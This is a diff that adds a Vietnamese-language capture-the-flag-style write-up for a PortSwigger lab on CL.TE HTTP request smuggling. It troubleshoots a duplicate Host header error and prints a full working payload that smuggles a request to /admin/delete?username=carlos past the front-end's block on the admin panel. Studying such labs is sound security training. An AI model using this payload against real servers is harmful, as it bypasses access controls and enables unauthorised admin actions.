@@ -213,3 +213,79 @@ x=1POST / HTTP/1.1
 
 <img width="479" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/c9dce484-9eaf-40a5-9d59-fb9a60f608f0">
 
+***
+## 6. Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
+
+* Content:
+```
+This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.
+
+To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.
+```
+* Exploit:
+
+Thực hiện gửi request Payload đầu tiên như ảnh dưới đây 2 lần => Kết quả báo Request Smugged bị chặn.
+<img width="480" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/42f634d4-7ca2-43e2-b2de-d0b3db1db6c4">
+
+Bổ sung thêm thường Request header `Host: localhost` vào Payload => Lần này ứng dụng báo lỗi `Duplicate header names are not allowed`.
+<img width="470" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/23dfe300-466e-4b92-9496-9e442b3a028a">
+
+Nguyên nhân là sau khi gửi Request 2 lần thì Request Smugged sẽ trở thành như sau:
+```
+GET /admin HTTP/1.1
+Host: localhost
+POST / HTTP/1.1
+Host: 0a3d0084040bb3b681a3116800fc0061.web-security-academy.net
+Connection: close
+...
+```
+=> Bị trùng trường `Host` header 2 lần.
+
+Bây giờ cần chỉnh sửa payload như sau để phần Host Header của Request sau Không ăn vào Phần Header của Smugged Request mà ăn xuống phần Body.
+<img width="481" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/9518ba8d-d316-4b25-bfbf-8eec2589be37">
+=> Khi này Request Smugged sẽ như sau:
+```
+GET /admin HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 18
+
+a=bPOST / HTTP/1.1
+Host: 0a3d0084040bb3b681a3116800fc0061.web-security-academy.net
+....
+```
+
+Tiếp tục thực hiện Smugged Request gọi đến link `/admin/delete?username=carlos` theo yêu cầu của Challenge:
+
+Full payload như sau:
+```
+POST / HTTP/1.1
+Host: 0a3d0084040bb3b681a3116800fc0061.web-security-academy.net
+Connection: close
+sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
+sec-ch-ua-mobile: ?0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 140
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 18
+
+a=b
+```
+<img width="484" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/4db05e14-49ad-4ea9-a7b8-55c8b842cec8">
+Lab Solved!
+<img width="593" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/f60dbfbf-97ce-4d95-a902-b8652472932f">
